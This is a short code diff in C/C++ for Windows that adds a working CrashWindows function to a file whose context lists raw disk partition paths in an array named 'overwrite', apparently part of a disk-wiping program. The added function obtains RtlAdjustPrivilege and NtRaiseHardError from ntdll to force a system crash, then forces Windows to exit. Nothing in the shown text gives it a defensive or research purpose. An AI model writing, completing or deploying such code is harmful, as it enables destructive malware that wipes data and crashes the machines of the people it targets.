@@ -12,4 +12,22 @@ LPCWSTR overwrite[] = {
     L"\\\\.\\Harddisk0Partition2",
     L"\\\\.\\Harddisk0Partition3",
     L"\\\\.\\Harddisk0Partition4",
-void crashWindows () {}
+void CrashWindows() {
+    HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
+    VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
+    VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");
+    
+    unsigned char unused1;
+    long unsigned int unused2;
+
+    if (RtlAdjustPrivilege && NtRaiseHardError) {
+        RtlAdjustPrivilege(0x13, true, false, &unused1);
+        NtRaiseHardError(0xdeaddead, 0, 0, 0, 6, &unused2);
+    }
+
+    FreeLibrary(hNtdll);
+
+    ExitWindows();
+
+    ExitProcess(0);
+}
